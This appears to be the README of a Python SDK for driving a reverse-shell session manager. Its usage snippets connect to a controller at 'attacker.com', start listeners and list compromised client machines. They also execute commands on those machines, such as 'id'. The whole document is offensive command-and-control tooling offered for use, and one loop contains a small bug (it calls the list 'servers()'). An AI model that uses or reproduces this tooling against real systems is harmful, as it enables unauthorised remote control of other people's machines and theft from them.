# Goporting-Python

Python SDK for reverse shell sessions manager [Goporting v1.3.1](https://github.com/ThraetCode/Goporting)

## Install

```bash
pip install goporting-python
```

## Usage

### Connect to Goporting endpoint
```python
import goporting_python as pp

p = pp.Goporting("attacker.com", 7331)
```

### Create a reverse shell server

```python
server = p.create_server("0.0.0.0", 13339)
```

### Stop a reverse shell server

```python
server = servers[0]
server.delete()
```

### Get all available listening servers

```python
servers = p.get_servers()
for server in servers():
    print(server)
```


### Get all online Clients of a server

```python
server = servers[0]
clients = server.get_clients()
for client in clients:
    print(client)
```

### Execute a command on a client

```python
client = clients[0]
client.system("id")
```
